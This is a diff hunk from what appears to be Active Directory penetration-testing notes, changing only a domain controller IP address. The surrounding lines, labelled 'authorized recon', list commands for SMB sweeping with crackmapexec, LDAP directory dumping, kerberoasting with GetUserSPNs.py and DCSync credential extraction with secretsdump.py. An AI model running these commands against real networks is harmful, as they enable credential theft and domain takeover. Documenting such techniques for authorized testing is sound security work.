@@ -59,7 +59,7 @@ flowchart LR
 # authorized recon
 crackmapexec smb 10.10.10.0/24 -u user -p pass          # sweep, sessions, shares
 ldapsearch -x -H ldap://dc01 -b "dc=corp,dc=local"      # dump directory
-GetUserSPNs.py corp/user:pass -dc-ip 10.0.0.1 -request  # kerberoast
+GetUserSPNs.py corp/user:pass -dc-ip 10.10.20.10 -request  # kerberoast
 secretsdump.py corp/user@dc01                            # DCSync if privileged
 ```
 **SMB** (445) carries file shares, named pipes, and `PsExec`-style execution; **null/guest sessions** and open shares are classic footholds.
